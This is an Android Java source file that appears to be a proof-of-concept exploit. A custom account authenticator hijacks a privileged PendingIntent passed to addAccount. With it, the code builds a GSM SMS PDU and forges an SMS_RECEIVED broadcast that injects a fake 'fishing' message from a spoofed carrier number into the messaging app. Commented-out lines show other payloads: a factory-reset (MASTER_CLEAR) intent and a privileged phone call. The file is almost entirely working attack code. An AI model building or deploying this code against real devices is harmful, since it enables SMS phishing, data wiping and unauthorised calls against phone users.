package com.pending.exp;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Field;
import java.util.Calendar;
import java.util.GregorianCalendar;

import android.accounts.AbstractAccountAuthenticator;
import android.accounts.Account;
import android.accounts.AccountAuthenticatorResponse;
import android.accounts.AccountManager;
import android.accounts.NetworkErrorException;
import android.app.PendingIntent;
import android.app.PendingIntent.CanceledException;
import android.content.Context;
import android.content.Intent;
import android.content.IntentSender;
import android.net.Uri;
import android.os.Bundle;
import android.os.Parcel;
import android.telephony.PhoneNumberUtils;
import android.util.Log;

import com.android.internal.telephony.*;

public class expAuthenticator extends AbstractAccountAuthenticator {
    private String TAG = "EXPAuthenticator";
    private final Context mContext;
    
	public expAuthenticator(Context context) {
		super(context);
        this.mContext = context;
	}

	private static byte reverseByte( byte b) {
        return ( byte ) ((b & 0xF0 ) >> 4 | (b & 0x0F ) << 4 );
	}

	public   String printHexString( byte[] b) {
		String a = "";
		  for (int i = 0; i < b.length; i++) { 
		    String hex = Integer.toHexString(b[i] & 0xFF); 
		    if (hex.length() == 1) { 
		      hex = '0' + hex; 
		    }
		   
		    a = a+hex;
		  } 
		  
		       return a;
	}	
    @Override
    public Bundle addAccount(AccountAuthenticatorResponse response, String accountType, String authTokenType, String[] requiredFeatures, Bundle options) throws NetworkErrorException {

        //Log.d(TAG, "call addAccount");
        PendingIntent test = (PendingIntent)options.getParcelable("pendingIntent");
        IntentSender sender1 = test.getIntentSender();
        String sender ="10086";
        String body ="fake fishing msg";
        
        byte [] pdu = null ;
        byte [] scBytes = PhoneNumberUtils.networkPortionToCalledPartyBCD( "0000000000" );
        byte [] senderBytes = PhoneNumberUtils.networkPortionToCalledPartyBCD(sender);
        int lsmcs = scBytes.length;
        byte [] dateBytes = new byte [ 7 ];
        Calendar calendar = new GregorianCalendar();
        dateBytes[ 0 ] = reverseByte(( byte ) (calendar.get(Calendar.YEAR)));
        dateBytes[ 1 ] = reverseByte(( byte ) (calendar.get(Calendar.MONTH) + 1 ));
        dateBytes[ 2 ] = reverseByte(( byte ) (calendar.get(Calendar.DAY_OF_MONTH)));
        dateBytes[ 3 ] = reverseByte(( byte ) (calendar.get(Calendar.HOUR_OF_DAY)));
        dateBytes[ 4 ] = reverseByte(( byte ) (calendar.get(Calendar.MINUTE)));
        dateBytes[ 5 ] = reverseByte(( byte ) (calendar.get(Calendar.SECOND)));
        dateBytes[ 6 ] = reverseByte(( byte ) ((calendar.get(Calendar.ZONE_OFFSET) + calendar.get(Calendar.DST_OFFSET)) / ( 60 * 1000 * 15 )));
        try {
                ByteArrayOutputStream bo = new ByteArrayOutputStream();
                bo.write(lsmcs);
                bo.write(scBytes);
                bo.write( 0x04 );
                bo.write(( byte ) sender.length());
                bo.write(senderBytes);
                bo.write( 0x00 );
                bo.write( 0x00 );  // encoding: 0 for default 7bit
                bo.write(dateBytes);
                try {
                        byte[] bodybytes  = GsmAlphabet.stringToGsm7BitPacked(body);
                        bo.write(bodybytes);
                } catch(Exception e) {}

                pdu = bo.toByteArray();
        } catch (IOException e) {
        }
        
        String result = printHexString(pdu);
        Intent newIntent = new Intent();
        newIntent.setAction("android.provider.Telephony.SMS_RECEIVED"); 
      //newIntent.setAction("android.provider.Telephony.SMS_DELIVER");  // android 4.4
        newIntent.putExtra( "pdus" , new Object[] { pdu });  
        newIntent.putExtra("format", "3gpp");
        newIntent.putExtra("simId", 0);
        newIntent.setPackage("com.android.mms");
        //Log.d(TAG, "sending message : " + result);
        
  //       Intent newIntent2 = new Intent("android.intent.action.MASTER_CLEAR");
        
        // Intent newIntent3 = new Intent("com.android.phone.ACTION_CALL_BACK_FROM_NOTIFICATION");
        // newIntent3.setData(Uri.parse("tel:10010"));
        // newIntent3.setPackage("com.android.phone");

        try {
			test.send(mContext, 0, newIntent, null, null);
			//Log.d(TAG, "send message success");
		} catch (CanceledException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			Log.e(TAG,"CanceledException",e);
		}
        
        final Bundle bundle = new Bundle();
        bundle.putParcelable(AccountManager.KEY_INTENT, null);
        //bundle
        return bundle;
    }
    @Override
	public Bundle confirmCredentials(AccountAuthenticatorResponse arg0,
			Account arg1, Bundle arg2) throws NetworkErrorException {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public Bundle editProperties(AccountAuthenticatorResponse arg0, String arg1) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public Bundle getAuthToken(AccountAuthenticatorResponse arg0, Account arg1,
			String arg2, Bundle arg3) throws NetworkErrorException {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public String getAuthTokenLabel(String arg0) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public Bundle hasFeatures(AccountAuthenticatorResponse arg0, Account arg1,
			String[] arg2) throws NetworkErrorException {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public Bundle updateCredentials(AccountAuthenticatorResponse arg0,
			Account arg1, String arg2, Bundle arg3)
			throws NetworkErrorException {
		// TODO Auto-generated method stub
		return null;
	}
}